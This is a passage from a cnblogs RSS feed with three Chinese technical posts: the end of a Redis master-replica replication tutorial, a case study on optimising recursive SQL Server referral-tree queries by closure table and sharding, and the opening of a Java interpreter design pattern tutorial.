&lt;p&gt;然后分别指定配置文件启动redis-server，在redis中bin目录下执行&lt;code&gt;./redis-server redis.conf&lt;/code&gt;、&lt;code&gt;./redis-server redis6388.conf&lt;/code&gt;、&lt;code&gt;./redis-server redis6399.conf&lt;/code&gt;命令即可，可以通过命令&lt;code&gt;ps -ef | grep redis&lt;/code&gt;查看启动redis效果，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/17/qfxviY37BMdrTe8.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201217161153175&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.1 使用命令实现主从关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;默认情况下，启动的三台服务器默认都是主服务器，现在可以通过简单的命令实现一主二从的关系，这里以6379这台服务器为主，6388和6399两台服务器为从，配置主从关系只针对从节点服务器配置即可，如下：&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;分别连上6388和6399两台服务器，执行&lt;code&gt;slaveof masterip masterport&lt;/code&gt;即可：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/17/Ob8sRZP7qcLayfD.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201217170814190&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;从节点显示没问题，看看主节点状态信息，连上6379这台看看，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/17/JispmlQNzAMGfOy.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201217171428807&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;主从关系维护好了，接下来看看数据复制，通常主节点负责写，将数据同步到从节点，从节点负责读； 现在三台服务器都没数据，接下来往主节点中写入点数据，看看是否能同步到从节点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/17/CX1nAKxzGsFd934.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201217172631976&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;注：如果通过命令方式实现主从关系，那当从服务器重启时，主从关系就丢了，还得手动再执行命令，所以推荐配置文件的形式进行配置；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.2 通过配置文件实现主从配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;还是很简单的，主服务器不用动，仅修改从服务器配置文件，然后重启即可，根据前面章节的学习经验，打开配置文件，直接找到&lt;strong&gt;REPLICATION&lt;/strong&gt;模块进行如下配置修改：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;replicaof &amp;lt;masterip&amp;gt; &amp;lt;masterport&amp;gt;&lt;/code&gt; ：指定主节点ip和端口即可，如：&lt;code&gt;replicaof 127.0.0.1 6379&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;masterauth &amp;lt;master-password&amp;gt;&lt;/code&gt;：指定主节点密码，如果主节点配置密码，直接通过这配置就行；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;修改完这两项，重启服务器即可，和命令行一样简单，只是通过配置文件搭建的主从关系不会因为关闭服务器而丢失；这里配置文件的演示就不截图了，只是实现方式不一样，其他都是和命令行一致；&lt;/p&gt;
&lt;h4 id=&quot;小总结&quot;&gt;小总结&lt;/h4&gt;
&lt;ul readability=&quot;4&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;配从不配主，即只针对从服务器配置即可，主服务器无需配置；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;一个主节点有多个从节点，从节点只能有一个主节点；从节点也可以作为其他从节点的主节点，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/18/UniRKhOJCz8P2gD.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201218123546841&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这种方式的演示截图就不提供了，小伙伴实操一把，这里说明一下，虽然6388是6399的主节点，但扮演的角色还是6379的从节点，只是它下面连接了其他从节点而已；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;如果用命令方式实现主从，主服务器断开后，重新连接，主从关系还在；从服务器断开之后重连关系消失，需要手动执行命令重新指定主节点；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;如果希望断开重连主从关系还在，推荐配置文件方式实现；&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;实现主从复制的搭建是不是很简单，不管是命令还是配置文件的方式，都很轻松实现；但小伙伴是不是也有疑问： 主从节点之间的数据是如何同步的？关于主从复制的其他参数有什么用？&lt;/p&gt;
&lt;h4 id=&quot;主从复制原理&quot;&gt;主从复制原理&lt;/h4&gt;
&lt;p&gt;通过上面实操，在主服务器中写入的数据，在无感知的情况下就同步到各个从服务器，中间到底经历了什么呢？ 接下来简单的了解一下；&lt;/p&gt;
&lt;p&gt;在Redis2.8之前同步方式都以全量方式同步，之后为了提高效率，数据复制方式分为两种，一种为全量复制，一种为部分复制：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;全量复制：即将主服务器中的数据，全部同步到从服务器；一般是在从服务器启动初始化数据的时候进行全量同步；&lt;/li&gt;
&lt;li&gt;部分复制：即将未同步的增量数据，同步到从服务器，无需全部再同步一遍；一般用于因网络中断等无法同步数据的情况，待恢复正常之后，将中断期间数据进行部分同步；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;为了方便查看日志分析，使用两台redis服务器进行搭建主从， 将之前搭建的关系去除，通过修改配置文件重启即可；&lt;/p&gt;
&lt;p&gt;这里以6388作为主节点(Master)，6399作为从节点(Slave)，当连接6399执行命令&lt;code&gt;slaveof 127.0.0.1 6388&lt;/code&gt;配置主从关系时，主从节点分别打印日志如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/18/N7WvkQBXU4SPZMb.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201218150346658&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图是刚开始建立主从关系时，进行了全量复制，大概流程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/18/E81olst7MVYyzvc.png&quot; alt=&quot;image-20201218233435825&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简要说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;从节点与主节点建立连接，然后发送同步请求psync；&lt;/li&gt;
&lt;li&gt;主节点给从节点发送信息，replid和offset，这两个参数后续是判断是否部分复制的关键数据；&lt;/li&gt;
&lt;li&gt;主节点fork子进程将全部数据生成RDB文件；&lt;/li&gt;
&lt;li&gt;主节点期间接收到的写命令存入到复制缓冲区中；&lt;/li&gt;
&lt;li&gt;当主节点RDB文件完成之后发送给从节点；&lt;/li&gt;
&lt;li&gt;从节点接收到文件，先清空老数据；&lt;/li&gt;
&lt;li&gt;从节点清空数据后，加载接收到的数据到内存中；&lt;/li&gt;
&lt;li&gt;主节点发送复制缓冲区中的数据到从节点；&lt;/li&gt;
&lt;li&gt;从节点接收到命令并执行，最终同步到最新数据；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;主从关系是通过网络进行通讯，可能出现网络中断或网络抖动情况，导致短时间的数据不能及时同步到从节点上，理想情况下，当连接恢复的时候，希望只同步中断期间的数据，从而提高同步效率，流程大概如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/18/2mPa43FS8YZ9pKc.png&quot; alt=&quot;image-20201218233509086&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简要说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;当主从之间由于网络中断时，从节点会尝试重连主节点；&lt;/li&gt;
&lt;li&gt;在此期间，主节点接收到的写命令会记录到复制缓冲区中；&lt;/li&gt;
&lt;li&gt;当网络恢复，从节点连上主节点，会请求发布同步请求psync，并带上之前主节点发送过来的replid和offset；&lt;/li&gt;
&lt;li&gt;主节点接收到从节点的请求，会验证接收的replid与主节点replid是否匹配，不匹配会进行全量复制；还会验证offset数据偏移量是否在合法范围内，如果中断期间数据量过大，导致复制缓冲区的数据超出，主从节点的offset数据偏移量不一致，也会进行全复制；&lt;/li&gt;
&lt;li&gt;当从节点传递过来的replid和offset验证通过时，则进行部分复制，并记录最新的offset；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这里就不模拟演示部分复制流程了，留给小伙伴操作。演示流程如下：已经搭建主从关系的两台机器，手动模拟网络断开，断开期间在主服务器写入数据，一会之后恢复网络，查看主从服务器日志打印情况；&lt;/p&gt;
&lt;h4 id=&quot;主从复制的相关配置参数&quot;&gt;主从复制的相关配置参数&lt;/h4&gt;
&lt;p&gt;以上演示在配置文件中只是配置了部分参数，还有其他参数的配置可以轻松实现功能，这里结合主从复制的内容可以回顾一下相关配置参数的意义，如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;slaveof&lt;/strong&gt;：设置本机为从机，指定主机的IP和端口；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;masterauth&lt;/strong&gt;：如果主机需要密码，通过这设置；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;slave-serve-stale-data&lt;/strong&gt;：从机如果与主机断开或数据正在同步，获取数据是否继续，如果设置为yes，还可以正常读取数据，设置为no，获取数据返回错误提示；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;slave-read-only&lt;/strong&gt;：配置从主机为只读模式，默认为yes，也强烈建议为只读模式；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-diskless-sync&lt;/strong&gt;：是否采用无磁盘方式进行主从传递数据，即采用Socket方式，默认没采用，如果机器磁盘性能不好，而网络环境良好，可以尝试使用这种模式；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-diskless-sync-delay&lt;/strong&gt;：当使用无磁盘方式传递数据时，服务器开始传递数据前等待指定时间，等待从服务器进入传输队列，提高数据传输效率，默认为5秒；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-ping-slave-period&lt;/strong&gt;：设置从机向主机发送ping消息间隔，即理解为心跳检测；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-timeout&lt;/strong&gt;：设置超时时间，主从机传递数据的时间，如果超过指定时间，从机会重连。一般主从复制数据比较大时，可以将其改大，默认为60s ；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-disable-tcp-nodelay&lt;/strong&gt;：主从复制数据是否采用TCP_NODELAY，默认为no，代表不启用，标识主机立即同步数据，保证数据一致性失效；如果设置为yes，合并较小的TCP包一并发送，延迟高，但可以提升带宽性能，但推荐不启用；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-backlog-size&lt;/strong&gt;：用于设置复制缓冲区的大小，此缓冲区用于从机断开重连之后同步的增量数据，在一定时间内不用全量复制，提升同步效率；默认为1mb，可以根据需求进行修改；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;repl-backlog-ttl&lt;/strong&gt;：设置从机断开后没有连接主机的间隔时间，超过此时间，设置的backlog缓冲区就会释放，默认为3600s；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;slave-priority&lt;/strong&gt;：用于哨兵模式选择，即当主机挂掉时，选择优先级较高的从机代替挂掉的主机，快速恢复；默认值为100；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;min-slaves-to-write 3&lt;/strong&gt;：指可用从服务器少于3个时，主服务器只能读，不能写，一般和min-slaves-max-lag搭配用，默认不使用，根据需要进行配置；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;min-slaves-max-lag 10&lt;/strong&gt;：指从服务器的延迟超过10秒时，主服务器也只能读，不能写，一般和min-slaves-to-write搭配用，默认不使用，根据需要进行配置；&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;主从复制有哪些问题&quot;&gt;主从复制有哪些问题&lt;/h4&gt;
&lt;p&gt;主从复制缓解了单节点性能和存储的瓶颈，那又带来什么问题呢？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;主从复制架构会有延时，尽快很快，也有，特别数据量和并发大的时候；目前的主从架构没有好的方法处理延时，MySql、SqlServer也是如此；&lt;/li&gt;
&lt;li&gt;过期Key数据在早期版本不能及时将从服务器数据失效，可以升级到redis3.2之后解决，因为加入了过期判断；&lt;/li&gt;
&lt;li&gt;主节点宕机之后，只能手动重新配置主从关系，从服务器可以执行&lt;code&gt;slaveof no one&lt;/code&gt;命令重写回到主服务器角色，然后重新配置主从关系；&lt;/li&gt;
&lt;li&gt;如果从节点过多，当刚开始初始化数据全量同步或多个从节点断开重连时，就会导致主节点的IO剧增；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;
&lt;p&gt;主从复制演练看似简单，但还需要不断在实践中获取经验，搭配相关配置参数，从而使得更加适合应用场景；配置没有固定都一样，而是应用场景是否适合。随着主节点宕机不能自动选举的问题，下次在此基础上说说哨兵模式，让自动选举不是问题；&lt;/p&gt;
&lt;p&gt;一个被程序搞丑的帅小伙，关注&quot;Code综艺圈&quot;，跟我一起学~~~&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/10/19/GOS4yrQMAvsWdIh.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:41:00 +0000</pubDate>
<dc:creator>Code综艺圈</dc:creator>
<og:description>前言 现在遇到高并发场景时，缓存技术应该算是性能优化的第一步，缓解数据库压力的同时还能提高访问效率，而Redis应该是绝大多数应用场景的首选。但是尽快Redis性能再优秀，在当今高并发场景下，一台服务</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zoe-zyq/p/14166298.html</dc:identifier>
</item>
<item>
<title>百万推荐关系优化实战 - 2J</title>
<link>http://www.cnblogs.com/jijunjian/p/14157623.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jijunjian/p/14157623.html</guid>
<description>&lt;p&gt;最近，一朋友整天因为CPU 99%搞得茶饭不思，夜不能寐，找到我”诉苦“。听完成，心中一阵窃喜：是时候展现真正的实力了（其实是练手的机会来了）。半推半就应承了下来。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;139&quot;&gt;

&lt;p&gt;　　最近，一朋友整天因为CPU 99%搞得茶饭不思，夜不能寐，找到我”诉苦“。听完成，心中一阵窃喜：是时候展现真正的实力了（其实是练手的机会来了）。半推半就应承了下来。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218230813125-1000244497.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p class=&quot;my_title&quot;&gt;01 &lt;strong&gt;&lt;strong&gt;分析&lt;/strong&gt;问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;        几分钟了解下来，大概情况如下：会员可以推荐其他用户注册，会员有一个属性--活跃度，用户观看视频，签到等等行为时，这个属性会动态变化，其中有个需求是统计所有下级活跃度。会员模型如下，模型比较简单，使用使用sqlserver 2016。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218230918768-818265969.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　了解需求后，再来看看占cpu高的查询。其中占cpu 时间最多的就是下面这条sql，查询某个用户所有下级的活跃度之和。这条语句使用递归查询，那是比较耗时的，另外如果层级太多还有如下错误：语句被终止。完成执行语句前已用完最大递归 100。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;WITH&lt;/span&gt;&lt;span&gt; T
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;AS&lt;/span&gt;&lt;span&gt;( 
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;SELECt&lt;/span&gt; DataID, avtivenewss &lt;span&gt;FROM&lt;/span&gt; &lt;span&gt;User&lt;/span&gt; &lt;span&gt;WHERE&lt;/span&gt; DataID &lt;span&gt;=&lt;/span&gt; &lt;span&gt;4167&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt;     &lt;span&gt;UNION&lt;/span&gt; &lt;span&gt;ALL&lt;/span&gt; 
&lt;span&gt;5&lt;/span&gt;     &lt;span&gt;SELECT&lt;/span&gt;&lt;span&gt; u.DataID, u.avtivenewss   
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;FROM&lt;/span&gt; &lt;span&gt;User&lt;/span&gt; U &lt;span&gt;INNER&lt;/span&gt; &lt;span&gt;JOIN&lt;/span&gt; T &lt;span&gt;ON&lt;/span&gt; U.parentUserid&lt;span&gt;=&lt;/span&gt;&lt;span&gt;T.DataID
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; &lt;span&gt;) 
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; &lt;span&gt;SELECT&lt;/span&gt; &lt;span&gt;sum&lt;/span&gt;(avtivenewss) &lt;span&gt;FROM&lt;/span&gt; T
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;strong&gt;当前用户1W+。&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;02 &lt;strong&gt;失败的尝试:前缀法&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;      几乎没思考，就想到了一个方法：前缀法。一个用户的所有后代使用同一个前缀。增加一个字段 paths，以用户编号为基础，格式为：/1/2/3/，用户注册时使用记录上级的paths + 上级id 生成自己的paths,  增加paths的索引，这样更具此字段就可以查询我的所有下级了，再写个脚步初始化。非常简单，三下五除二就解决了。上线效果非常明显。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231149618-898754665.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　但是好景真短，没两天cpu 又高了。一查，好多查询都没有走索引，明明字段已经加了索引。一看数据，原来是索引长度限制问题。用户居然有好几十个层级，且还在不断增加，长度超过索引最大长度后，索引失效。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;当前用户10W+。&lt;/strong&gt;&lt;/p&gt;

&lt;p class=&quot;my_title&quot;&gt;04 &lt;strong&gt;大胆猜测，小心尝试&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;     会员关系是一棵树，不管怎么遍历，效率都有限。如果把树拉平，用户与所有后代都建立一个关系，性能会怎么样呢。为了避免再次打脸，悄悄的开始了尝试。增加模型tree。&lt;/p&gt;
&lt;p&gt;　   &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231322894-848192347.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这需要在用户注册时，添加与所有祖祖辈辈的关系。比如 4167用户注册，需要一次添加14条关系记录。而查询用户的所有子子孙孙时，也会非常方便。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231344678-1317097770.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　编写脚本初始化数据，增加切换开关，战战兢兢的上线了。经过一个高峰，cpu居然都在10%以下，完全没有压力嘛，终于可以亮出脸来了。&lt;strong&gt;这是典型的空间换时间&lt;/strong&gt;。但是高兴之余，心中闪过一个念头--这个表的膨胀速度有点快，它会有极限么。不过，马上被另一个念头压制了：小网站能有多大量！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231423194-870696837.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　有个什么定律来着：凡事只要有可能出错，那就一定会出错。果不其然，10天后同样的问题再次发生。cpu几乎爆满。只能不停重启，最后干脆下掉了这个统计功能，为此还被怼了一顿，甚至说实在不行换mysql吧。我竟无言以对。此时关系表总数为10亿。&lt;/p&gt;
&lt;p&gt; 　　&lt;strong&gt;当前用户100W+。&lt;/strong&gt;&lt;/p&gt;

&lt;p class=&quot;my_title&quot;&gt;05 &lt;strong&gt;终级方案：分表&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;     其实对于分表这样的事儿，一直都有想过，就是没干过，另外也一直以为是sum()引起的cpu问题。后来咨询了公司做交易的同学，传说他们每天处理2kw的订单，基本思路也是根据用户id分了2048张表。反正也没辙了，撸起袖子搞起来吧。分析了tree 表只有两个查询场景，查用户所有后代及查用户所有祖先。分别以ancestor ，descendant 分256 张表。用户注册时，把关系分别写到个分表中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231533476-2052426566.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　编写脚本初始化两个纬度的分表数据，再次战战兢兢的上线了。经过数个高峰，效果比预期好太多了。彻底告别了cpu告警。&lt;br/&gt;经历了几次失败，早以没了高兴劲儿，心中有个疑问，如果是sum引起的cpu跑满的话，现在sum并没有减少，但是cpu为啥清闲了呢？这背后一定有原因的。&lt;/p&gt;


&lt;p class=&quot;my_title&quot;&gt;06 &lt;strong&gt;刨根问底&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt; &lt;/p&gt;
&lt;p&gt;      带着上面的疑问，对比了一些监控数据，发现了一个可疑的地方，磁盘请求减少了数百次。那么磁盘与cpu有什么样的关系呢？&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202012/88102-20201218231704178-1745146499.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　查询相关资料后，得出一个猜测：&lt;/p&gt;
&lt;p&gt;　　未分表前，每次查询所有后代（祖先时）时，因为数据在磁盘上非常分散，page cache 命中率低，磁盘预读失效，所以一次查询要进行很多次磁盘随机读，大量的io操作，cpu就要进行大量的上下文切换，从而导致cpu跑满。&lt;/p&gt;
&lt;p&gt;　　分表后，每次查询所有后代（祖先时）时，每次都在特定的分表中查询，数据在磁盘上非常紧凑，磁盘预读发挥最大性能，page cache 命中率高，io次数据大量减少，cpu上下文切换次数减少，没了压力，cpu自然清闲了。&lt;/p&gt;

&lt;p&gt;　　   &lt;strong&gt;最后打个广告：哈啰出行，base 杭州， java 我们的部门有大量HC（供应链，本地生活方向都有）, 欢迎私聊哈。微信：jijunjian&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;         I have a dream to be a good programmer。&lt;/p&gt;
&lt;p&gt;         &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202004/88102-20200429125523007-1330403336.png&quot; alt=&quot;&quot; width=&quot;424&quot; height=&quot;224&quot;/&gt;&lt;/p&gt;


&lt;/div&gt;</description>
<pubDate>Mon, 21 Dec 2020 00:34:00 +0000</pubDate>
<dc:creator>2J</dc:creator>
<og:description>最近，一朋友整天因为CPU 99%搞得茶饭不思，夜不能寐，找到我”诉苦“。听完成，心中一阵窃喜：是时候展现真正的实力了（其实是练手的机会来了）。半推半就应承了下来。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jijunjian/p/14157623.html</dc:identifier>
</item>
<item>
<title>「补课」进行时：设计模式(20)——解释器模式 - 极客挖掘机</title>
<link>http://www.cnblogs.com/babycomeon/p/14166288.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/babycomeon/p/14166288.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://cdn.geekdigging.com/DesignPatterns/java_design_pattern.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-前文汇总&quot;&gt;1. 前文汇总&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.geekdigging.com/category/%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f/&quot; target=&quot;_blank&quot;&gt;「补课」进行时：设计模式系列&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;2-解释器模式&quot;&gt;2. 解释器模式&lt;/h2&gt;
&lt;p&gt;解释器模式这个模式和前面的访问者模式比较像，当然，我说的比较像是难的比较像，以及使用率是真的比较低，基本上没有使用的场景，访问者模式还有点使用场景，解释器模式，我们又不写解释器，这玩意 JVM 都帮我们实现掉了，哪用我们自己实现。&lt;/p&gt;
&lt;p&gt;常见的解释器有 JVM 为我们提供的 Java 语言的解释器，还有我们经常使用的 MySQL ，也有内置的 SQL 解释器。&lt;/p&gt;
&lt;p&gt;不过没用是没用，对应的模式我们还是可以学习一下。&lt;/p&gt;
&lt;h3 id=&quot;21-定义&quot;&gt;2.1 定义&lt;/h3&gt;
&lt;p&gt;解释器模式（Interpreter Pattern） 是一种按照规定语法进行解析的方案，其定义如下：&lt;/p&gt;
&lt;p&gt;Given a language, define a representation for its grammar along with an&lt;br/&gt;interpreter that uses the representation to interpret sentences in the language.（给定一门语言， 定义它的文法的一种表示， 并定义一个解释器， 该解释器使用该表示来解释语言中的句子。 ）&lt;/p&gt;
&lt;h3 id=&quot;22-通用类图&quot;&gt;2.2 通用类图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.geekdigging.com/DesignPatterns/20/Interpreter_UML.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;AbstractExpression 抽象解释器：具体的解释任务由各个实现类完成， 具体的解释器分别由 TerminalExpression 和 NonterminalExpression 完成。&lt;/li&gt;
&lt;li&gt;TerminalExpression 终结符表达式：实现与文法中的元素相关联的解释操作， 通常一个解释器模式中只有一个终结符表达式， 但有多个实例， 对应不同的终结符。&lt;/li&gt;
&lt;li&gt;NonterminalExpression 非终结符表达式：文法中的每条规则对应于一个非终结表达式， 具体到我们的例子就是加减法规则分别对应到 AddExpression 和 SubExpression 两个类。 非终结符表达式根据逻辑的复杂程度而增加， 原则上每个文法规则都对应一个非终结符表达式。&lt;/li&gt;
&lt;li&gt;Context 环境角色&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;23-通用代码&quot;&gt;2.3 通用代码&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;抽象表达式&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class Expression {
    abstract Object interpreter(Context ctx);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;抽象表达式比较简单，通常只有一个方法，但是它是生成语法集合（也叫做语法树） 的关键， 每个语法集合完成指定语法解析任务， 它是通过递归调用的方式， 最终由最小的语法单元进行解析完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;终结符表达式&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TerminalExpression extends Expression {
    // 通常终结符表达式只有一个， 但是有多个对象
    public Object interpreter(Context context) {
        return null;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;终结符表达式比较简单， 主要是处理场景元素和数据的转换。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;非终结符表达式&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class NonterminalExpression extends Expression {
    // 每个非终结符表达式都会对其他表达式产生依赖
    public NonterminalExpression(Expression ...expressions) {
    }
    @Override
    Object interpreter(Context ctx) {
        // 进行文法处理
        return null;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;每个非终结符表达式都代表了一个文法规则， 并且每个文法规则都只关心自己周边的文法规则的结果（注意是结果） ， 因此这就产生了每个非终结符表达式调用自己周边的非终结符表达式， 然后最终、 最小的文法规则就是终结符表达式， 终结符表达式的概念就是如此，不能够再参与比自己更小的文法运算了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;客户端&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Client {
    public static void main(String[] args) {
        Context ctx = new Context();
        Stack&amp;lt;Expression&amp;gt; stack = null;
        for(int i = 0; i &amp;lt; args.length; i++){
            // 进行语法判断， 并产生递归调用
        }
        // 产生一个完整的语法树， 由各个具体的语法分析进行解析
        Expression exp = stack.pop();
        //具体元素进入场景
        exp.interpreter(ctx);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;24-优点&quot;&gt;2.4 优点&lt;/h3&gt;
